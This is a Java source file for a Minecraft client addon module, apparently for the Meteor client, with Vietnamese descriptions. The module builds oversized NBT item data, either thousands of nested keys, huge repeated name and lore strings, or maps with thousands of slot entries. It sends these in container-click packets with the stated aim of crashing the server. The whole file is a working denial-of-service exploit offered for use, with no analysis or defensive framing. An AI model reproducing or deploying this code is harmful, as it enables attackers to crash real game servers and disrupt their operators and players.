package com.karmacrash;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.settings.*;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;

public class Overflow1Module extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("Số lượng gói tin gửi để crash server.")
        .defaultValue(1)
        .min(1)
        .build()
    );

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Chế độ crash.")
        .defaultValue(Mode.Comp)
        .build()
    );

    private final Setting<Integer> size = sgGeneral.add(new IntSetting.Builder()
        .name("size")
        .description("Kích thước dữ liệu NBT hoặc số lần lặp.")
        .defaultValue(16000)
        .min(1)
        .build()
    );

    public Overflow1Module() {
        super(Overflow1Addon.CATEGORY, "overflow1", "Gửi gói tin Overflow để crash server.");
    }

    @Override
    public void onActivate() {
        Int2ObjectOpenHashMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
        CompoundTag comp = new CompoundTag();

        switch (mode.get()) {
            case Comp:
                CompoundTag finalComp = new CompoundTag();
                for (int j = 0; j < size.get(); j++) {
                    comp.put("xynis-viaver-exploit" + j, finalComp);
                }
                ItemStack compStack = new ItemStack(Items.CHERRY_CHEST_BOAT, 1);
                compStack.setTag(comp);
                for (int i = 0; i < 10; i++) {
                    int2objectmap.put(i, compStack);
                }
                for (int i = 0; i < packets.get(); i++) {
                    mc.player.networkHandler.sendPacket(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, compStack, int2objectmap));
                }
                break;

            case Display:
                CompoundTag chestTag = new CompoundTag();
                ListTag itemsList = new ListTag();
                ListTag lore = new ListTag();
                String longSpam = "X\nY\nN\nI\nS\n\n".repeat(size.get());
                StringTag loreLine = StringTag.valueOf(longSpam);
                for (int i = 0; i < 4; i++) {
                    lore.add(loreLine);
                }
                CompoundTag display = new CompoundTag();
                display.put("Name", StringTag.valueOf(longSpam));
                display.put("Lore", lore);
                comp.put("display", display);
                for (int i = 0; i < 27; i++) {
                    CompoundTag itemTag = new CompoundTag();
                    itemTag.putInt("Slot", i);
                    itemTag.putString("id", "minecraft:apple");
                    itemTag.putInt("Count", 1);
                    itemTag.put("tag", comp);
                    itemsList.add(itemTag);
                }
                chestTag.put("BlockEntityTag", new CompoundTag());
                chestTag.getCompound("BlockEntityTag").put("Items", itemsList);
                ItemStack displayStack = new ItemStack(Items.CHERRY_CHEST_BOAT, 1);
                displayStack.setTag(comp);
                for (int i = 0; i < 10; i++) {
                    int2objectmap.put(i, displayStack);
                }
                for (int i = 0; i < packets.get(); i++) {
                    mc.player.networkHandler.sendPacket(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, displayStack, int2objectmap));
                }
                break;

            case Map:
                ItemStack mapStack = new ItemStack(Items.BEDROCK, 1);
                for (int i = 0; i < size.get(); i++) {
                    int2objectmap.put(i, mapStack);
                }
                for (int i = 0; i < packets.get(); i++) {
                    mc.player.networkHandler.sendPacket(new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP_ALL, mapStack, int2objectmap));
                }
                break;
        }

        info("Đã gửi " + packets.get() + " gói tin với mode " + mode.get() + " và size " + size.get() + "!");
        this.toggle(); // Tắt module sau khi hoàn thành
    }

    public enum Mode {
        Comp,
        Display,
        Map
    }
}